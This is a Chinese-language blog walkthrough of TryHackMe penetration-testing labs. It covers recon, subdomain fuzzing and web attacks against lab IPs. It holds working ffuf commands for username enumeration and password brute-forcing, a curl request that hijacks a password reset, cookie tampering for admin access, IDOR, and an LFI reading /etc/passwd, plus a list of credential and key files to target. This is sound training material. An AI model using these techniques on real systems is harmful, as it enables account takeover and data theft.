<li>遏制、根除和恢复：一旦检测到事件，就必须阻止它影响其他系统，消除它并恢复受影响的系统。例如，当我们注意到某个系统感染了计算机病毒时，我们希望阻止（遏制）病毒传播到其他系统，清理（根除）病毒，并确保系统正确恢复。</li>
<li>事件后活动：成功恢复后，将生成报告，并分享经验教训，以防止将来发生类似的事件。</li>
</ol>
<h5 id="恶意软件分析"><a href="#恶意软件分析" class="headerlink" title="恶意软件分析"></a>恶意软件分析</h5><p>恶意软件代表恶意软件。<em>软件</em>是指可以保存在磁盘上或通过网络发送的程序、文档和文件。恶意软件包括多种类型，例如：</p>
<ul>
<li>病毒是一段代码（程序的一部分），它把自身附加到一个程序上。它旨在从一台计算机传播到另一台计算机;此外，它的工作原理是在感染计算机后更改、覆盖和删除文件。结果范围从计算机变慢到无法使用。</li>
<li>特洛伊木马是一种程序，它显示一个理想的功能，但在下面隐藏了一个恶意功能。例如，受害者可能会从可疑网站下载视频播放器，从而使攻击者能够完全控制其系统。</li>
<li>勒索软件是一种加密用户文件的恶意程序。加密会使文件在不知道加密密码的情况下无法读取。如果用户愿意支付 “赎金”，攻击者会向用户提供加密密码。</li>
</ul>
<p>恶意软件分析旨在通过各种方式了解此类恶意程序：</p>
<ol>
<li>静态分析的工作原理是检查恶意程序而不运行它。通常，这需要扎实的汇编语言知识（处理器的指令集，即计算机的基本指令）。</li>
<li>动态分析的工作原理是在受控环境中运行恶意软件并监控其活动。它允许您观察恶意软件在运行时的行为方式。</li>
</ol>
<h3 id="Task3-防御性安全的实际示例"><a href="#Task3-防御性安全的实际示例" class="headerlink" title="Task3 防御性安全的实际示例"></a>Task3 防御性安全的实际示例</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>您是负责保护银行的安全<em>运营中心</em> （SOC） 的一员。该银行的 SOC 使用<em>安全信息和事件管理</em> （SIEM） 系统。SIEM 从各种来源收集与安全相关的信息和事件，并通过一个系统呈现它们。例如，如果登录尝试失败或从意外的地理位置尝试登录，您将收到通知。此外，随着机器学习的出现，SIEM 可能会检测到异常行为，例如用户在凌晨 3 点登录，而他通常只在工作时间登录。</p>
<h4 id="防御性安全练习"><a href="#防御性安全练习" class="headerlink" title="防御性安全练习"></a>防御性安全练习</h4><p>注意到在早上十点出现<code>143.110.250.149</code>的ip进行未授权连接22端口</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907231824825.png"></p>
<p>我们利用ip查询工具进行查询</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907231956129.png"></p>
<p>成功找到恶意ip的实际地址</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907232049117.png"></p>
<p>上报给团队负责人后，添加黑名单</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907232122011.png"></p>
<h2 id="Web-Hacking简介"><a href="#Web-Hacking简介" class="headerlink" title="Web Hacking简介"></a>Web Hacking简介</h2><h3 id="遍历应用程序"><a href="#遍历应用程序" class="headerlink" title="遍历应用程序"></a>遍历应用程序</h3><p>手工检查web应用程序</p>
<ul>
<li><strong>查看源代码</strong> - 使用浏览器查看网站的人类可读源代码</li>
<li><strong>检查器</strong> - 了解如何检查页面元素并进行更改以查看通常被阻止的内容</li>
<li><strong>Debugger</strong> - 检查和控制页面 JavaScript 的流程</li>
<li><strong>网络</strong> - 查看页面发出的所有网络请求</li>
</ul>
<h4 id="Task1-查看页面源"><a href="#Task1-查看页面源" class="headerlink" title="Task1 查看页面源"></a>Task1 查看页面源</h4><p>在本房间学习，如何仅使用浏览器中的内置工具手动检查 Web 应用程序是否存在安全问题</p>
<p>我们通过查看源代码，注意到注释里的特殊路径</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908153301291.png"></p>
<p>访问<code>/new-home-beta</code>得到第一个flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908153339759.png"></p>
<p>我们注意到第41行的超链接，访问得到第二个flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908154022933.png"></p>
<p>注意到这些文件都存放在<code>/assets</code>目录下</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908155643133.png"></p>
<p>访问得到第三个flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908155729873.png"></p>
<p>继续往下找发现web程序使用的框架是<code>THM v1.2</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908154613841.png"></p>
<p>尝试从框架入手，跟进一下更新日志</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908154739924.png"></p>
<p>我们注意到在1.3版本把备份文件存储到不可读取的区域，而我们刚好是1.2尝试读取备份文件<code>/tmp.zip</code>，解压得到第四个flag</p>
<h4 id="Task2-开发人员工具-inspector"><a href="#Task2-开发人员工具-inspector" class="headerlink" title="Task2 开发人员工具-inspector"></a>Task2 开发人员工具-inspector</h4><p>我们注意到news的第三篇是需要付费的，被付费墙挡住了</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908160841529.png"></p>
<p>我们F12打开web开发者工具，将鼠标移到挡住的墙上</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908160947764.png"></p>
<p>注意到<code>premium-customer-blocker</code>属性的display元素是block，我们将其改为none成功读取到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908161131675.png"></p>
<h4 id="Task3-开发人员工具-调试器"><a href="#Task3-开发人员工具-调试器" class="headerlink" title="Task3 开发人员工具 - 调试器"></a>Task3 开发人员工具 - 调试器</h4><blockquote>
<p>开发人员工具中的这个面板用于调试 JavaScript，对于想要找出某些内容可能无法正常工作的原因的 Web  开发人员来说，它同样是一个出色的功能。但作为渗透测试人员，它为我们提供了深入研究 JavaScript 代码的选项。在 Firefox 和  Safari 中，此功能称为 Debugger，但在 Google Chrome 中，它称为 Sources。</p>
</blockquote>
<p>我们点击contact界面，然后点击调试器的flash.min.js文件，点击左下角的美化</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908162252766.png"></p>
<p>在第110行打下断点，刷新此页面得到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908162322192.png"></p>
<h4 id="Task4-开发人员工具-网络"><a href="#Task4-开发人员工具-网络" class="headerlink" title="Task4 开发人员工具 - 网络"></a>Task4 开发人员工具 - 网络</h4><p>先清空下网络的缓存，然后填写表单发送。从响应处得到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908162736012.png"></p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="Task1-手动发现-robots-txt"><a href="#Task1-手动发现-robots-txt" class="headerlink" title="Task1 手动发现-robots.txt"></a>Task1 手动发现-robots.txt</h4><p>访问<code>/robots.txt</code>即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909221113716.png"></p>
<h4 id="Task2-手动发现-Favicon"><a href="#Task2-手动发现-Favicon" class="headerlink" title="Task2 手动发现-Favicon"></a>Task2 手动发现-Favicon</h4><blockquote>
<p>网站图标是显示在浏览器地址栏或选项卡中的一个小图标，用于为网站打造品牌。有时当使用框架构建网站时，作为安装一部分的网站图标会留下来，如果网站开发人员没有用自定义图标替换它，这可以给我们提供关于正在使用的框架的线索。OWASP 托管一个通用框架图标数据库，您可以使用该数据库来检查目标 favicon <code>https://wiki.owasp.org/index.php/OWASP_favicon_database</code>。一旦我们了解了框架堆栈，我们就可以使用外部资源来发现更多关于它的信息</p>
</blockquote>
<p>某个网站的图标没有被开发人员自定义替换，我们下载目标网站图标并获取其 md5 哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909221952856.png"></p>
<p>通过在<code>https://wiki.owasp.org/index.php/OWASP_favicon_database</code>查询，得到是cgiirc框架</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909222212741.png"></p>
<h4 id="Task3-手动发现-Sitemap-xml"><a href="#Task3-手动发现-Sitemap-xml" class="headerlink" title="Task3 手动发现-Sitemap.xml"></a>Task3 手动发现-Sitemap.xml</h4><blockquote>
<p>与限制搜索引擎爬虫可以查看的内容的 robots.txt 文件不同，sitemap.xml 文件提供了网站所有者希望在搜索引擎上列出的每个文件的列表。这些有时可能包含网站中更难导航到的区域，甚至列出一些当前网站不再使用但仍在幕后运行的旧网页。</p>
</blockquote>
<p>访问<code>/sitemap.xml</code>得到线索</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909222920203.png"></p>
<h4 id="Task4-手动发现-HTTP请求头"><a href="#Task4-手动发现-HTTP请求头" class="headerlink" title="Task4 手动发现-HTTP请求头"></a>Task4 手动发现-HTTP请求头</h4><p> 使用curl命令的<code>-v</code>参数启用详细模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.48.71/ -v</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909223104756.png"></p>
<h4 id="Task5-手动发现-框架堆栈"><a href="#Task5-手动发现-框架堆栈" class="headerlink" title="Task5 手动发现 - 框架堆栈"></a>Task5 手动发现 - 框架堆栈</h4><blockquote>
<p>一旦你建立了一个网站的框架，无论是从上面的网站图标示例，还是通过在页面源中寻找线索（如评论、版权声明或信用），你都可以找到该框架的网站。从那里，我们可以了解有关软件和其他信息的更多信息，这可能会导致我们可以发现更多内容。</p>
</blockquote>
<p>在页面源码发现框架网站，来看看THM框架的文档</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908155130497.png"></p>
<p>存在admin管理员用户，我们访问<code>/thm-framework-login</code>登录找到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909223354212.png"></p>
<h4 id="Task6-开源情报-谷歌搜索语法"><a href="#Task6-开源情报-谷歌搜索语法" class="headerlink" title="Task6 开源情报-谷歌搜索语法"></a>Task6 开源情报-谷歌搜索语法</h4><p>利用谷歌搜索引擎的特殊语法</p>
<table>
<thead>
<tr>
<th><strong>滤波器</strong></th>
<th><strong>例</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>site</td>
<td>site:tryhackme.com</td>
<td>仅返回来自指定网站地址的结果</td>
</tr>
<tr>
<td>inurl</td>
<td>inurl：admin</td>
<td>返回 URL 中包含指定单词的结果</td>
</tr>
<tr>
<td>filetype</td>
<td>filetype：PDF</td>
<td>返回具有特定文件扩展名的结果</td>
</tr>
<tr>
<td>intitle</td>
<td>intitle：admin</td>
<td>返回标题中包含指定单词的结果</td>
</tr>
</tbody></table>
<p>更多语法可参考<code> https://en.wikipedia.org/wiki/Google_hacking</code></p>
<h4 id="Task7-开源情报-Wappalyzer"><a href="#Task7-开源情报-Wappalyzer" class="headerlink" title="Task7 开源情报-Wappalyzer"></a>Task7 开源情报-Wappalyzer</h4><blockquote>
<p>Wappalyzer （<code>https://www.wappalyzer.com/</code>） 是一个在线工具和浏览器扩展，可帮助识别网站使用的技术，例如框架、内容管理系统 （CMS）、支付处理器等等，它甚至可以找到版本号。</p>
</blockquote>
<h4 id="Task8-开源情报-Github"><a href="#Task8-开源情报-Github" class="headerlink" title="Task8 开源情报-Github"></a>Task8 开源情报-Github</h4><blockquote>
<p>您可以使用 GitHub 的搜索功能查找公司名称或网站名称，以尝试查找属于您的目标的存储库。一旦被发现，您可能可以访问源代码、密码或其他尚未找到的内容。</p>
</blockquote>
<h4 id="Task9-开源情报-S3-Buckets"><a href="#Task9-开源情报-S3-Buckets" class="headerlink" title="Task9 开源情报-S3 Buckets"></a>Task9 开源情报-S3 Buckets</h4><blockquote>
<p>S3 Buckets 是 Amazon AWS 提供的一项存储服务，允许人们将文件甚至静态网站内容保存在云中，可通过 HTTP 和 HTTPS  访问。文件所有者可以设置访问权限，将文件设为公共、私有甚至可写。有时，这些访问权限设置不正确，并无意中允许访问不应向公众开放的文件。S3 存储桶的格式为 <code>http(s)://&#123;name&#125;.s3.amazonaws.com</code> 其中 {name} 由所有者决定，例如 <a href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>。可以通过多种方式发现 S3 存储桶，例如在网站的页面源、GitHub 存储库中查找 URL，甚至自动执行该过程。一种常见的自动化方法是使用公司名称，后跟  {name}-assets、{name}-www、{name}-public、{name}-private 等常用术语 。  </p>
</blockquote>
<h4 id="Task10-自动发现"><a href="#Task10-自动发现" class="headerlink" title="Task10 自动发现"></a>Task10 自动发现</h4><p>使用ffuf和gobuster都可以，挂openvpn太慢了所以这里拿attackbox扫的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.48.71/FUZZ</span><br><span class="line">gobuster dir --url http://10.10.48.71/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909233018270.png"></p>
<h3 id="子域枚举"><a href="#子域枚举" class="headerlink" title="子域枚举"></a>子域枚举</h3><h4 id="Task1-开源情报-SSL-TLS-证书"><a href="#Task1-开源情报-SSL-TLS-证书" class="headerlink" title="Task1 开源情报-SSL&#x2F;TLS 证书"></a>Task1 开源情报-SSL&#x2F;TLS 证书</h4><p> <strong>SSL&#x2F;TLS 证书</strong></p>
<blockquote>
<p>当 CA（证书颁发机构）为域创建 SSL&#x2F;TLS（安全套接字层&#x2F;传输层安全性）证书时，CA 会参与所谓的“证书透明度 （CT）  日志”。这些是为域名创建的每个 SSL&#x2F;TLS 证书的可公开访问日志。Certificate Transparency  日志的目的是阻止使用恶意和意外制作的证书。我们可以利用这项服务来发现属于某个域的子域，像<a href="http://crt.sh/"> https://crt.sh</a> 和 <a href="https://ui.ctsearch.entrust.com/ui/ctsearchui">https://ui.ctsearch.entrust.com/ui/ctsearchui</a> 这样的网站提供了一个可搜索的证书数据库，可以显示当前和历史结果。</p>
</blockquote>
<p>我们访问<code>https://crt.sh</code>，搜索<code>tryhackme.com</code>域名，成功找到在2020-12-26创建的子域名</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910170654998.png"></p>
<h4 id="Task2-开源情报-搜索引擎"><a href="#Task2-开源情报-搜索引擎" class="headerlink" title="Task2 开源情报-搜索引擎"></a>Task2 开源情报-搜索引擎</h4><p>利用谷歌的搜索引擎，查找<code>tryhackme.com</code>的子域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:*.tryhackme.com</span><br></pre></td></tr></table></figure>

<p>如果想排除某子域名比如www，可以执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:*.tryhackme.com -site:www.tryhackme.com</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910171122442.png"></p>
<h4 id="Task3-DNS-暴力破解"><a href="#Task3-DNS-暴力破解" class="headerlink" title="Task3  DNS 暴力破解"></a>Task3  DNS 暴力破解</h4><blockquote>
<p>Bruteforce DNS（域名系统）枚举是从预定义的常用子域列表中尝试数十、数百、数千甚至数百万个不同可能的子域的方法。由于此方法需要许多请求，因此我们使用工具将其自动化以加快流程。</p>
</blockquote>
<p>使用dnsrecon工具进行扫描</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910171235345.png"></p>
<h4 id="Task4-开源情报-Sublist3r"><a href="#Task4-开源情报-Sublist3r" class="headerlink" title="Task4 开源情报-Sublist3r"></a>Task4 开源情报-Sublist3r</h4><p>使用Sublist3r实现自动化探测子域名</p>
<h4 id="Task5-虚拟主机"><a href="#Task5-虚拟主机" class="headerlink" title="Task5 虚拟主机"></a>Task5 虚拟主机</h4><blockquote>
<p>某些子域并不总是托管在可公开访问的 DNS 结果中，例如 Web 应用程序的开发版本或管理门户。相反这些可以保存在私有 DNS 服务器上，也可以记录在开发人员计算机上的 &#x2F;etc&#x2F;hosts 文件（或 Windows 用户的 c：\windows\system32\drivers\etc\hosts  文件）中，该文件将域名映射到 IP 地址。由于当客户端请求某个网站时，Web 服务器可以在一台服务器上托管多个网站，因此我们可以从http请求头host上进行扫描</p>
</blockquote>
<p>使用ffuf扫描靶机的子域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.37.27</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910173800805.png"></p>
<p>这里会出现非常多的扫描结果，可以使用<code>-fs</code>参数进行过滤，因为大部分的无价值的响应内容大小相同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.37.27 -fs 2395</span><br></pre></td></tr></table></figure>

<p>成功扫出来子域名<code>delta</code>和<code>yellow</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910173828597.png"></p>
<h3 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h3><h4 id="Task1-用户名枚举"><a href="#Task1-用户名枚举" class="headerlink" title="Task1 用户名枚举"></a>Task1 用户名枚举</h4><p>我们在网站的注册页面进行用户创建时，当我们注册用户名为admin时会回显<code>username already exists</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910174636222.png"></p>
<p>我们可以利用此错误消息的存在，使用ffuf工具对用户名进行枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=test&amp;password=test&amp;cpassword=test&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.32.235/customers/signup -mr &quot;username already exists&quot; &gt;&gt; listofusers.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：在上面的示例中， <code>-w</code>参数选择计算机上包含我们要检查的用户名列表的文件位置。 <code>-X</code>参数指定请求方法，默认情况下这将是 GET 请求，但在我们的示例中它是 POST 请求。 <code>-d</code>参数指定我们要发送的数据。在我们的示例中，我们有用户名、电子邮件、密码和 cpassword 字段。我们已将用户名的值设置为<strong>FUZZ</strong> 。在 ffuf 工具中，FUZZ 关键字表示单词列表中的内容将插入到请求中的位置。 <code>-H</code>参数用于向请求添加附加标头。在本例中，我们设置<code>Content-Type</code> ，以便 Web 服务器知道我们正在发送表单数据。 <code>-u</code>参数指定我们发出请求的 URL，最后， <code>-mr</code>参数是我们要查找的页面上的文本，以验证我们是否找到了有效的用户名。</p>
</blockquote>
<p>得到四个用户名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">simon</span><br><span class="line">steve</span><br><span class="line">robert</span><br></pre></td></tr></table></figure>



<h4 id="Task2-暴力破解"><a href="#Task2-暴力破解" class="headerlink" title="Task2 暴力破解"></a>Task2 暴力破解</h4><p>将扫出来的用户名添加到<code>listofusers.txt</code>文件里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w listofusers.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.122.157/customers/login -fc 200</span><br></pre></td></tr></table></figure>

<p>成功爆破出用户以及对应的密码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910233319355.png"></p>
<h4 id="Task3-逻辑缺陷"><a href="#Task3-逻辑缺陷" class="headerlink" title="Task3 逻辑缺陷"></a>Task3 逻辑缺陷</h4><p>示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( url.<span class="title function_ invoke__">substr</span>(<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;/admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment"># Code to check user is an admin</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># View Page</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在访问<code>/admin</code>的时候会对用户进行检查，由于上面的 PHP 代码示例使用三个等号 (&#x3D;&#x3D;&#x3D;)，因此它会在字符串上查找完全匹配的内容，包括相同的字母大小写。但如果我们访问<code>/adMin</code>将不会被检查权限，从而实现绕过身份验证</p>
<p>在本靶机中的<code>/customer/reset</code>路径下存在重置密码功能，如果输入的电子邮件无效，您将收到错误消息“从提供的电子邮件地址找不到帐户”。假设我们使用已接受的电子邮件地址去发送，将会看到确认信息发送至邮件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910234900589.png"></p>
<p>经过测试，当我们通过GET传参重置密码对应的电子邮件时，成功发送说明存在缺陷</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &#x27;http://10.10.122.157/customers/reset?email=robert%40acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911002104446.png"></p>
<p>靶机的应用程序中，使用查询字符串检索用户帐户，但稍后在应用程序逻辑中，使用PHP变量<code>$_REQUEST</code>中找到的数据发送密码重置电子邮件。由于PHP <code>$_REQUEST</code>变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名，则该变量的应用程序逻辑更倾向于 POST 数据字段而不是查询字符串</p>
<p>我们先注册我们自己的账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911002418021.png"></p>
<p>然后利用 <code>$_REQUEST</code>的特性缺陷优先匹配POST参数值，由于该邮件地址<code>customer.acmeitsupport.thm</code>存在对应的用户rev1ve，使得电子邮件成功发送到我们的账号下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &#x27;http://10.10.122.157/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=rev1ve@customer.acmeitsupport.thm&#x27;</span><br></pre></td></tr></table></figure>

<p>发送后刷新下用户界面，成功收到电子邮件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911002617659.png"></p>
<p>点击链接成功访问到robert用户的界面，拿到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911003238230.png"></p>
<h4 id="Task4-Cookie篡改"><a href="#Task4-Cookie篡改" class="headerlink" title="Task4 Cookie篡改"></a>Task4 Cookie篡改</h4><p>Cookie如果为纯文本形式的话，作用其实是很明显的，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: admin=false;logged_in=false</span><br></pre></td></tr></table></figure>

<p>上述Cookie控制着是否登陆成功以及是否为管理员用户</p>
<p>当我们正常去curl目标页面时显示没有登录</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911093616797.png"></p>
<p>尝试发送修改的cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Cookie:logged_in=true; admin=true&quot; http://10.10.56.209/cookie-test</span><br></pre></td></tr></table></figure>

<p>成功以管理员身份登录</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911093900033.png"></p>
<p>如果Cookie是编码形式的话，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/</span><br><span class="line"># &#123;&quot;id&quot;:1,&quot;admin&quot;: false&#125; </span><br></pre></td></tr></table></figure>

<p>我们只需要将admin键改为true后，再base6 4编码回去即可</p>
<h3 id="不安全直接对象引用"><a href="#不安全直接对象引用" class="headerlink" title="不安全直接对象引用"></a>不安全直接对象引用</h3><blockquote>
<p>IDOR代表不安全直接对象引用，是一种访问控制漏洞。当 Web 服务器接收用户提供的输入以检索对象（文件、数据、文档）、对输入数据过于信任并且未在服务器端进行验证以确认输入数据时，可能会发生此类漏洞。请求的对象属于请求它的用户。</p>
</blockquote>
<p>打开靶机，创建用户后登录</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911141751452.png"></p>
<p>在account界面F12点击网络，刷新一下发现存在路径为 <code>/api/v1/customer?id=50</code>的端点的调用</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911141718661.png"></p>
<p>并且查看下响应的json数据，刚好id为50是对应我们账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911141909028.png"></p>
<p>尝试查看id为1的用户，成功获得用户信息</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911142134614.png"></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="Task1-路径遍历"><a href="#Task1-路径遍历" class="headerlink" title="Task1 路径遍历"></a>Task1 路径遍历</h4><p>常见操作系统文件</p>
<table>
<thead>
<tr>
<th><strong>Location 地点</strong></th>
<th><strong>Description 描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;issue</td>
<td>包含在登录提示之前打印的消息或系统标识。</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;profile</td>
<td>控制系统范围的默认变量，例如导出变量、文件创建掩码 (umask)、终端类型、指示新邮件何时到达的邮件消息</td>
</tr>
<tr>
<td>&#x2F;proc&#x2F;version</td>
<td>指定Linux内核的版本</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;passwd</td>
<td>拥有有权访问系统的所有注册用户</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;shadow</td>
<td>包含有关系统用户密码的信息</td>
</tr>
<tr>
<td>&#x2F;root&#x2F;.bash_history</td>
<td>包含 root 用户的历史命令</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;dmessage</td>
<td>包含全局系统消息，包括系统启动期间记录的消息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;mail&#x2F;root</td>
<td>root用户的所有电子邮件</td>
</tr>
<tr>
<td>&#x2F;root&#x2F;.ssh&#x2F;id_rsa</td>
<td>服务器上 root 或任何已知有效用户的SSH私钥</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</td>
<td>Apache Web 服务器的访问请求</td>
</tr>
<tr>
<td>C:\boot.ini</td>
<td>包含具有BIOS固件的计算机的启动选项</td>
</tr>
</tbody></table>
<h4 id="Task2-本地文件包含-LFI"><a href="#Task2-本地文件包含-LFI" class="headerlink" title="Task2 本地文件包含 - LFI"></a>Task2 本地文件包含 - LFI</h4><p>如果include函数没有限制目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;lang&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么就可以直接读取敏感文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?lab1.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911143938668.png"></p>
<p>如果限制了读取的目录，比如当我们输入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?lab2.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>会发现有报错，<code>includes</code>目录下没有此文件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911144305697.png"></p>
<p>对于黑盒测试来说，我们可以利用包含不存在的文件或者输入无效的输入，触发报错来泄露错误信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(includes//etc/passwd) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab2.php on line 26</span><br></pre></td></tr></table></figure>

<p>从而知道包含的目录，并且还知道了当前工作路径<code>/var/www/html</code></p>
